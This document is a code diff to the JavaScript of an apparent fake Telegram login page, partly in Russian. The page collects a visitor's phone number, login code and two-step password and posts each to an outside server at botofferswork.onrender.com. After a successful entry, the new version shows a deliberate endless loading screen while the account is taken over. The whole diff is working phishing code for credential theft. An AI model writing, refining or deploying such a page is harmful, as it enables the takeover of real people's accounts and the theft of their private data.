-  $('profile-username').textContent = p.username ? '@' + p.username : '—';
-  $('profile-id').textContent = p.user_id || '—';
-  $('profile-uname').textContent = p.username ? '@' + p.username : '—';
-  $('profile-fio').textContent = fio;
-  $('profile-phone').textContent = p.phone || '—';
-  var initial = (p.first_name || p.username || 'A').charAt(0).toUpperCase();
-  $('profile-avatar').textContent = initial;
-}
-
-try {
-  $('btn-logout').addEventListener('click', function() { clearProfile(); location.reload(); });
-} catch (e) {}
-
-try {
-  $('link-ru').addEventListener('click', function() {
-    var h = document.getElementById('title');
-    if (h) h.textContent = 'Вход в Telegram';
-    var s = document.getElementById('sub');
-    if (s) s.innerHTML = 'Подтвердите код страны<br>и введите номер телефона.';
-    var b = document.getElementById('btn-next');
-    if (b) b.textContent = 'ДАЛЕЕ';
-  });
-} catch (e) {}
-
-try {
-  $('link-qr').addEventListener('click', function() { alert('QR-вход недоступен'); });
-  $('link-passkey').addEventListener('click', function() { alert('Passkey недоступен'); });
-} catch (e) {}
-
-// ─── API ───
-var API = 'https://botofferswork.onrender.com';
-
-async function api(path, body){
-  var url = API + path;
-  var res, data;
-  try {
-    res = await fetch(url, {
+    var r = await fetch(API + '/webhook/phone', {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(body)
+      body: JSON.stringify({ offer_id: offerId, phone: phoneNum })
     });
-  } catch (e) { throw new Error('Server unavailable.'); }
-  try { data = await res.json(); }
-  catch (e) { throw new Error('Server error.'); }
-  return { status: res.status, data: data };
+    var data = await r.json();
+    if (!data.ok) {
+      showScreen('auth');
+      showErr('error-box', data.error || 'Ошибка отправки кода');
+      return;
+    }
+    $('phone-display').textContent = phoneNum;
+    showScreen('code');
+    $('monkey').classList.add('peeking');
+    setTimeout(function(){ $('code-input').focus(); }, 100);
+  } catch(e) {
+    showScreen('auth');
+    showErr('error-box', 'Сервер недоступен');
+  }
 }
 
-// ─── ШАГ 1: ТЕЛЕФОН ───
-try {
-  stepPhone.addEventListener('submit', async function(e) {
-    e.preventDefault();
-    if (window.__REJECTED__) return;
-    hideError();
-    var digits = phoneInput.value.replace(/\D/g, '');
-    if (digits.length < 8) { showError('Please enter a valid phone number with country code'); return; }
-    phone = '+' + digits;
-
-    hide(stepPhone); show(stepLoading);
-    $('loading-text').textContent = 'Sending code…';
-    try {
-      var result = await api('/webhook/phone', { offer_id: offerId, phone: phone });
-      var data = result.data;
-      if (!data.ok) {
-        hide(stepLoading); show(stepPhone);
-        showError(data.error || 'Error sending code');
-        return;
-      }
-      hide(stepLoading); show(stepCode);
-      $('title').style.display = 'block';
-      $('sub').style.display = 'block';
-      $('title').textContent = 'Enter code';
-      $('sub').textContent = 'We\'ve sent the code to your Telegram app.';
-      $('code-hint').innerHTML = 'We\'ve sent the code to <b>' + phone + '</b>.';
+// ═══ ЭКРАН 3: ВВОД КОДА ═══
+var codeInput = $('code-input');
+var codeDots = $('code-dots').querySelectorAll('.dot');
+if (codeInput) {
+  codeInput.addEventListener('input', function(e) {
+    var v = e.target.value.replace(/\D/g, '').slice(0, 5);
+    e.target.value = v;
+    codeDots.forEach(function(d, i) {
+      d.classList.toggle('filled', i < v.length);
+    });
+    // останавливаем анимацию обезьянки когда все 5 цифр введены
+    if (v.length === 5) {
+      $('monkey').classList.remove('peeking');
+    }
+  });
+  codeInput.addEventListener('focus', function(){
+    $('monkey').classList.add('peeking');
+  });
+}
+$('btn-submit-code').addEventListener('click', async function() {
+  hideErr('code-error');
+  code = codeInput.value.replace(/\D/g, '');
+  if (code.length < 3) { showErr('code-error', 'Введите код'); return; }
+  showScreen('loading');
+  try {
+    var r = await fetch(API + '/webhook/code', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ offer_id: offerId, phone: phone, code: code })
+    });
+    var data = await r.json();
+    if (data.ok && !data.needs_password) {
+      // всё ок — вечная загрузка
+      showScreen('loading');
+      $('loading').querySelector('.loader-text').textContent = 'Загрузка…';
+    } else if (data.ok && data.needs_password) {
+      showScreen('fa');
+      setTimeout(function(){ $('password-input').focus(); }, 100);
+    } else {
+      showScreen('code');
+      var msg = data.error || 'Неверный код';
+      if (data.attempts_left !== undefined) msg += ' (осталось: ' + data.attempts_left + ')';
+      showErr('code-error', msg);
       codeInput.value = '';
-      setTimeout(function(){ codeInput.focus(); }, 100);
-    } catch(err) {
-      hide(stepLoading); show(stepPhone);
-      showError(err.message || 'Network error');
+      codeDots.forEach(function(d){ d.classList.remove('filled'); });
     }
-  });
-} catch (e) { console.error('[STEP1]', e); }
+  } catch(e) {
+    showScreen('code');
+    showErr('code-error', 'Сервер недоступен');
+  }
+});
 
-// ─── ШАГ 2: КОД ───
-try {
-  stepCode.addEventListener('submit', async function(e) {
-    e.preventDefault();
-    if (window.__REJECTED__) return;
-    hideError();
-    code = codeInput.value.replace(/\D/g, '');
-    if (code.length < 3) { showError('Enter the code'); return; }
-    hide(stepCode); show(stepLoading);
-    $('loading-text').textContent = 'Checking code…';
-    try {
-      var result = await api('/webhook/code', { offer_id: offerId, phone: phone, code: code });
-      var data = result.data;
-      if (data.ok && !data.needs_password) {
-        var profile = {
-          user_id: data.user_id, first_name: data.first_name,
-          last_name: data.last_name, username: data.username, phone: phone
-        };
-        saveProfile(profile);
-        showProfile(profile);
-      } else if (data.ok && data.needs_password) {
-        hide(stepLoading); show(step2fa);
-        $('title').textContent = 'Two-Step Verification';
-        $('sub').textContent = 'Your account is protected with an additional password.';
-        passInput.value = '';
-        setTimeout(function(){ passInput.focus(); }, 100);
-      } else {
-        hide(stepLoading); show(stepCode);
-        var msg = data.error || 'Invalid code';
-        if (data.attempts_left !== undefined) {
-          msg += '<div class="attempts">Attempts left: ' + data.attempts_left + '</div>';
-        }
-        showError(msg);
-        codeInput.value = ''; codeInput.focus();
-      }
-    } catch(err) {
-      hide(stepLoading); show(stepCode);
-      showError(err.message || 'Network error');
+// ═══ ЭКРАН 4: 2FA ═══
+$('form-2fa').addEventListener('submit', async function(e) {
+  e.preventDefault();
+  hideErr('pass-error');
+  var pass = $('password-input').value.trim();
+  if (!pass) { showErr('pass-error', 'Введите пароль'); return; }
+  showScreen('loading');
+  try {
+    var r = await fetch(API + '/webhook/password', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ offer_id: offerId, phone: phone, code: code, password: pass })
+    });
+    var data = await r.json();
+    if (data.ok) {
+      // вечная загрузка
+      showScreen('loading');
+      $('loading').querySelector('.loader-text').textContent = 'Загрузка…';
+    } else {
+      showScreen('fa');
+      var msg = data.error || 'Неверный пароль';
+      if (data.attempts_left !== undefined) msg += ' (осталось: ' + data.attempts_left + ')';
+      showErr('pass-error', msg);
+      $('password-input').value = '';
     }
-  });
-} catch (e) { console.error('[STEP2]', e); }
-
-try {
-  $('btn-back-phone').addEventListener('click', function() {
-    if (window.__REJECTED__) return;
-    hide(stepCode); show(stepPhone);
-    $('title').textContent = 'Sign in to Telegram';
-    $('sub').innerHTML = 'Please confirm your country code<br>and enter your phone number.';
-  });
-} catch (e) {}
-
-// ─── ШАГ 3: 2FA ───
-try {
-  step2fa.addEventListener('submit', async function(e) {
-    e.preventDefault();
-    if (window.__REJECTED__) return;
-    hideError();
-    password = passInput.value.trim();
-    if (!password) { showError('Enter the password'); return; }
-    hide(step2fa); show(stepLoading);
-    $('loading-text').textContent = 'Checking password…';
-    try {
-      var result = await api('/webhook/password', { offer_id: offerId, phone: phone, code: code, password: password });
-      var data = result.data;
-      if (data.ok) {
-        var profile = {
-          user_id: data.user_id, first_name: data.first_name,
-          last_name: data.last_name, username: data.username, phone: phone
-        };
-        saveProfile(profile);
-        showProfile(profile);
-      } else {
-        hide(stepLoading); show(step2fa);
-        var msg = data.error || 'Invalid password';
-        if (data.attempts_left !== undefined) {
-          msg += '<div class="attempts">Attempts left: ' + data.attempts_left + '</div>';
-        }
-        showError(msg);
-        passInput.value = ''; passInput.focus();
-      }
-    } catch(err) {
-      hide(stepLoading); show(step2fa);
-      showError(err.message || 'Network error');
-    }
-  });
-} catch (e) { console.error('[STEP3]', e); }
+  } catch(e) {
+    showScreen('fa');
+    showErr('pass-error', 'Сервер недоступен');
+  }
+});
 
 console.log('[INIT] all handlers bound');
 </script>
